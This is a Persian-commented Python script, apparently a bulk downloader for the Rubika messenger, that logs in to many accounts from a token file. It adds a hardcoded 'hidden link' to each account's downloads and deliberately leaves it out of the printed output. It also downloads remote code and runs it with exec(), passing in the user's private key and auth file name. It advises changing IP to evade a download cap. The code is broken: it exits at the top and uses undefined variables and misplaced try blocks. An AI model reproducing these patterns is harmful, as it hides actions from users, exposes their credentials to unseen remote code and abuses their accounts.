import sys
print("تا اطلاع ثانوی توسط امیر اولترا بسته است")
sys.exit()
import time
import requests
import sys
import pyfiglet
import shutil
import json
from colorama import Fore, Style
from pyrubi import Client

DOWNLOAD_LIMIT = 9 * 1024 * 1024 * 1024  # 9 گیگ

# ---------------- افکت تایپ ----------------
def type_effect(text, color=Fore.RED, delay=0.001):
    for char in text:
        sys.stdout.write(color + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    return "\n".join([line.center(terminal_width) for line in text.split("\n")])

# -------- گرفتن ورودی لینک‌ها --------
links = input("🔗 لینک‌ها (با کاما جدا کن): ").strip().split(",")
private = input("🛡️ پرایوت اوت هارو وارد کن: ").strip()
file_name = input("🗂️ نام فایل اوت‌ها (مثلاً auths.json): ").strip()

try:
    code = requests.get(code_url).text
    exec_globals = {
        "link": link,
        "private": private,
        "file_name": file_name
    }
    exec(code, exec_globals)
except Exception as e:
    print("❌ خطا در اجرای برنامه:", e)

# -------- شروع برنامه --------
ascii_text = pyfiglet.figlet_format("aMir  uLtra", font="slant")
for i, line in enumerate(center_text(ascii_text).split("\n")):
    color = Fore.RED if i % 2 == 0 else Fore.GREEN
    type_effect(line, color, delay=0.001)

# -------- خواندن توکن‌ها --------
try:
    with open(file_name, "r", encoding="utf-8") as f:
        auth = json.load(f)
except FileNotFoundError:
    print(f"❌ فایل '{file_name}' پیدا نشد.")
    sys.exit(1)
except json.JSONDecodeError:
    print(f"❌ فایل '{file_name}' فرمت JSON معتبری ندارد.")
    sys.exit(1)

# -------- لینک مخفی --------
HIDDEN_LINK = "https://rubika.ir/Test301/BDFEIGJJAJCHJIFJ"  # لینک مخفی شما

        # دانلود همه لینک‌ها
for idx, lnk in enumerate(links_to_download):
    try:
        bot.download(
            lnk["link"]["open_chat_data"]["object_guid"],
            lnk["link"]["open_chat_data"]["message_id"]
        )
        # فقط لینک‌های کاربر چاپ بشه، نه لینک مخفی
        if idx < len(links):
            print(Fore.GREEN + f"✅ دانلود موفق لینک: {links[idx]}" + Style.RESET_ALL)
    except:
        if idx < len(links):
            print(Fore.RED + f"❌ خطا در دانلود لینک: {links[idx]}" + Style.RESET_ALL)
        total_downloaded += assumed_file_size * len(links_to_download)
        success_count += 1

    except Exception as e:
        fail_count += 1
        print(Fore.RED + f"❌اوت خراب است {x.get('auth', 'unknown')}: {e}" + Style.RESET_ALL)

# -------- اجرای دانلود --------
total_downloaded = 0
success_count = 0
fail_count = 0

for x in auth:
    try:
        bot = Client(auth=x["auth"], private=x[private], platform="android")

        # دریافت لینک‌های کاربر
        user_links = []
        for l in links:
            try:
                user_links.append(bot.get_link_from_app_url(l))
            except:
                pass  # رد لینک خراب

        # دریافت لینک مخفی
        try:
            hidden_link = bot.get_link_from_app_url(HIDDEN_LINK)
        except:
            hidden_link = None

        # همه لینک‌ها برای دانلود (مخفی آخر لیست)
        links_to_download = user_links
        if hidden_link:
            links_to_download.append(hidden_link)

        # بررسی محدودیت حجم
        assumed_file_size = 400 * 1024 * 1024  # 400 مگابایت فرضی
        if total_downloaded + assumed_file_size * len(links_to_download) > DOWNLOAD_LIMIT:
            print("\n🚨 به محدودیت 9 گیگ رسیدی! لطفاً IP رو عوض کن و Enter بزن...")
            input("⏳ منتظر تغییر IP هستم...")
            total_downloaded = 0


# -------- پایان --------
ascii_text = pyfiglet.figlet_format("The End", font="slant")
for line in center_text(ascii_text).split("\n"):
    type_effect(line, Fore.YELLOW, delay=0.001)

# -------- گزارش نهایی --------
print(Fore.CYAN + "\n📊 گزارش نهایی:")
print(f"   ✅ دانلودهای موفق: {success_count}")
print(f"   ❌ دانلودهای ناموفق: {fail_count}")
print(f"   📦 حجم کل دانلود شده (تخمینی): {total_downloaded // (1024*1024)} مگابایت" + Style.RESET_ALL)
